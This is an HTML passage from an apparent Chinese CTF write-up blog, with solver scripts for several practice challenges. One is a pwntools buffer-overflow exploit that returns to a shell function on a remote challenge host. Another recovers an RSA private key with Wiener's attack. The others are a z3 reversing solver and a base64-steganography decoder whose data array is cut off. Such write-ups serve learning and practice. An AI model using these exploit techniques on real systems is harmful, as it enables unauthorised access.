class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">r = [<span class="number">208</span>, <span class="number">225</span>, <span class="number">237</span>, <span class="number">20</span>, <span class="number">214</span>, <span class="number">183</span>, <span class="number">79</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">217</span>, <span class="number">125</span>, <span class="number">66</span>, <span class="number">123</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span> , <span class="number">105</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">202</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">29</span>, <span class="number">63</span>, <span class="number">223</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">219</span>, <span class="number">32</span>]</span><br><span class="line">s = [BitVec(<span class="string">&#x27;s%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>)]</span><br><span class="line">print(len(r),len(s))</span><br><span class="line">so = Solver()</span><br><span class="line"></span><br><span class="line">so.add(r[<span class="number">0</span>]==s[<span class="number">0</span>]+s[<span class="number">2</span>]+s[<span class="number">4</span>]<span class="number">-0x64</span>)</span><br><span class="line">so.add(r[<span class="number">1</span>]==s[<span class="number">6</span>]+s[<span class="number">8</span>]+s[<span class="number">0xa</span>])</span><br><span class="line">so.add(r[<span class="number">2</span>]==s[<span class="number">0xc</span>]+s[<span class="number">0xe</span>]+s[<span class="number">0x10</span>])</span><br><span class="line">so.add(r[<span class="number">3</span>]==s[<span class="number">0x12</span>]+s[<span class="number">0x1</span>]-s[<span class="number">0x1e</span>])</span><br><span class="line">so.add(r[<span class="number">4</span>]==s[<span class="number">3</span>]+s[<span class="number">0x16</span>]+s[<span class="number">3</span>]<span class="number">-0x64</span>)</span><br><span class="line">so.add(r[<span class="number">5</span>]==s[<span class="number">5</span>]+s[<span class="number">0x1d</span>]+s[<span class="number">0x1c</span>]-s[<span class="number">7</span>]<span class="number">-0x64</span>)</span><br><span class="line">so.add(r[<span class="number">6</span>]==s[<span class="number">9</span>]+s[<span class="number">0x11</span>]-s[<span class="number">0xb</span>])</span><br><span class="line">so.add(r[<span class="number">7</span>]==-(s[<span class="number">0x13</span>]+s[<span class="number">0x1b</span>])+s[<span class="number">0xd</span>]+s[<span class="number">0xf</span>]+s[<span class="number">0x14</span>])</span><br><span class="line">so.add(r[<span class="number">8</span>]==s[<span class="number">0x15</span>]+s[<span class="number">0x17</span>]+s[<span class="number">0x17</span>])</span><br><span class="line">so.add(r[<span class="number">9</span>]==s[<span class="number">0x19</span>]+s[<span class="number">0x1a</span>])</span><br><span class="line">so.add(r[<span class="number">10</span>]==s[<span class="number">0x1e</span>])</span><br><span class="line">so.add(r[<span class="number">11</span>]==s[<span class="number">9</span>])</span><br><span class="line">so.add(r[<span class="number">12</span>]==s[<span class="number">8</span>])</span><br><span class="line">so.add(r[<span class="number">13</span>]==s[<span class="number">0</span>])</span><br><span class="line">so.add(r[<span class="number">14</span>]==s[<span class="number">1</span>])</span><br><span class="line">so.add(r[<span class="number">15</span>]==s[<span class="number">2</span>])</span><br><span class="line">so.add(r[<span class="number">16</span>]==s[<span class="number">3</span>])</span><br><span class="line">so.add(r[<span class="number">17</span>]==s[<span class="number">4</span>])</span><br><span class="line">so.add(r[<span class="number">18</span>]==s[<span class="number">5</span>])</span><br><span class="line">so.add(r[<span class="number">19</span>]==s[<span class="number">6</span>])</span><br><span class="line">so.add(r[<span class="number">20</span>]==s[<span class="number">7</span>])</span><br><span class="line">so.add(r[<span class="number">21</span>]==s[<span class="number">0</span>]+s[<span class="number">0xb</span>])</span><br><span class="line">so.add(r[<span class="number">22</span>]==s[<span class="number">0x1d</span>])</span><br><span class="line">so.add(r[<span class="number">23</span>]==s[<span class="number">0x1d</span>])</span><br><span class="line">so.add(r[<span class="number">24</span>]==s[<span class="number">0x1d</span>]-s[<span class="number">0xd</span>])</span><br><span class="line">so.add(r[<span class="number">25</span>]==s[<span class="number">0x1c</span>]-s[<span class="number">0xe</span>])</span><br><span class="line">so.add(r[<span class="number">26</span>]==s[<span class="number">0x1c</span>]+s[<span class="number">0xf</span>])</span><br><span class="line">so.add(r[<span class="number">27</span>]==s[<span class="number">0</span>]-s[<span class="number">0x1b</span>])</span><br><span class="line">so.add(r[<span class="number">28</span>]==s[<span class="number">0x17</span>]-s[<span class="number">0x18</span>])</span><br><span class="line">so.add(r[<span class="number">29</span>]==s[<span class="number">0x1a</span>]+s[<span class="number">0</span>]-s[<span class="number">1</span>])</span><br><span class="line">so.add(r[<span class="number">30</span>]==s[<span class="number">0x13</span>])</span><br><span class="line">so.add(r[<span class="number">31</span>]==s[<span class="number">0xb</span>]+s[<span class="number">0xc</span>])</span><br><span class="line">so.add(r[<span class="number">32</span>]==s[<span class="number">0x15</span>]-s[<span class="number">0x14</span>])</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">if</span> so.check()==sat:</span><br><span class="line">    m = so.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> m[i]!=<span class="literal">None</span>:</span><br><span class="line">            res.append(m[i].as_long())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;none&#x27;</span>,i)</span><br><span class="line">print(res)</span><br><span class="line">print(bytes(res))</span><br></pre></td></tr></table></figure>

<h2 id="pwn-BJDCTF-2nd-r2t3"><a href="#pwn-BJDCTF-2nd-r2t3" class="headerlink" title="[pwn][BJDCTF 2nd]r2t3"></a>[pwn][BJDCTF 2nd]r2t3</h2><p>长度是unsigned int8类型的，可以溢出</p>
<p>程序中有个函数可以获取shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib32/libc.so.6&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25713</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./r2t3&#x27;)</span></span><br><span class="line"></span><br><span class="line">getsh = <span class="number">0x804858b</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x11</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(getsh)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*(<span class="number">256</span>+<span class="number">4</span>-len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-rsa2"><a href="#Crypto-rsa2" class="headerlink" title="[Crypto]rsa2"></a>[Crypto]rsa2</h2><p>低解密指数攻击</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> RSAwienerHacker</span><br><span class="line"></span><br><span class="line">d = RSAwienerHacker.hack_RSA(e,N)</span><br><span class="line">print(d)</span><br><span class="line">print(hex(d))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>需要注意的是，上述代码需要在python2中运行，python2和python3的hex()函数有点不同，python2会在末尾加一个L，python3没有L</p>
<h2 id="misc-大白"><a href="#misc-大白" class="headerlink" title="[misc]大白"></a>[misc]大白</h2><p>使用010editor可以验证图片的CRC</p>
<p>修改图片的宽度和高度相同，就可以得到flag</p>
<h2 id="rev-NPUCTF2020-芜湖🛫"><a href="#rev-NPUCTF2020-芜湖🛫" class="headerlink" title="[rev][NPUCTF2020]芜湖🛫"></a>[rev][NPUCTF2020]芜湖🛫</h2><p>先解密数据再解密字符串，原来是base64隐写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">andd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    v3=<span class="number">1</span> <span class="keyword">if</span> a&amp;b==<span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    v4=<span class="number">1</span> <span class="keyword">if</span> v3&amp;a==<span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    v5=<span class="number">1</span> <span class="keyword">if</span> v3&amp;b==<span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> v4&amp;v5==<span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">tab = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>]</span><br><span class="line">rtab = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    rtab[tab[i]]=i</span><br><span class="line">a = [<span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x59</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0xc</span>, <span class="number">0x2f</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x4</span>, <span class="number">0x2f</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x2f</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x17</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x8</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x8</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x2e</span>, <span class="number">0x2a</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x10</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x10</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0xc</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x2d</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x36</span>, <span class="number">0x23</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x36</span>, <span class="number">0x10</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x53</span>, <span class="number">0x6</span>, <span class="number">0x2d</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x14</span>, <span class="number">0x2f</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x32</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x4</span>, <span class="number">0x38</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x56</span>, <span class="number">0x2d</span>, <span class="number">0x20</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x8</span>, <span class="number">0x11</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x10</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x28</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x19</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x12</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0x4</span>, <span class="number">0x51</span>, <span class="number">0x2d</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x2e</span>, <span class="number">0x37</span>, <span class="number">0x57</span>, <span class="number">0x2a</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x26</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x8</span>, <span class="number">0x2e</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x11</span>, <span class="number">0x2d</span>, <span class="number">0x27</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x2a</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x18</span>, <span class="number">0x37</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x36</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x36</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x2a</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x2b</span>, <span class="number">0x57</span>, <span class="number">0x28</span>, <span class="number">0x32</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x53</span>, <span class="number">0x16</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x36</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0xc</span>, <span class="number">0x51</span>, <span class="number">0x2d</span>, <span class="number">0x25</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x4a</span>, <span class="number">0x38</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x18</span>, <span class="number">0xe</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x53</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x53</span>, <span class="number">0x6</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x4</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x57</span>, <span class="number">0x16</span>, <span class="number">0x2d</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x2</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x2</span>, <span class="number">0x57</span>, <span class="number">0x28</span>, <span class="number">0x4</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x53</span>, <span class="number">0x12</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x2a</span>, <span class="number">0x26</span>, <span class="number">0x2c</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x2d</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x8</span>, <span class="number">0x16</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0x14</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x8</span>, <span class="number">0x13</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x28</span>, <span class="number">0x2e</span>, <span class="number">0x2c</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x53</span>, <span class="number">0x19</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x2a</span>, <span class="number">0x57</span>, <span class="number">0x11</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x22</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x36</span>, <span class="number">0xb</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x4</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0xc</span>, <span class="number">0x19</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x26</span>, <span class="number">0x59</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x22</span>, <span class="number">0x55</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x4a</span>, <span class="number">0x13</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x4a</span>, <span class="number">0x13</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x8</span>, <span class="number">0x27</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0x53</span>, <span class="number">0x3b</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0x53</span>, <span class="number">0x3b</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x36</span>, <span class="number">0xf</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x10</span>, <span class="number">0x14</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x57</span>, <span class="number">0x7</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x53</span>, <span class="number">0xd</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, <span class="number">0x28</span>, <span class="number">0x4</span>, <span class="number">0x10</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x19</span>, <span class="number">0x2d</span>, <span class="number">0x2d</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x11</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0xc</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x32</span>, <span class="number">0x32</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x4a</span>, <span class="number">0x58</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x32</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x36</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x8</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x59</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x15</span>, <span class="number">0x54</span>, <span 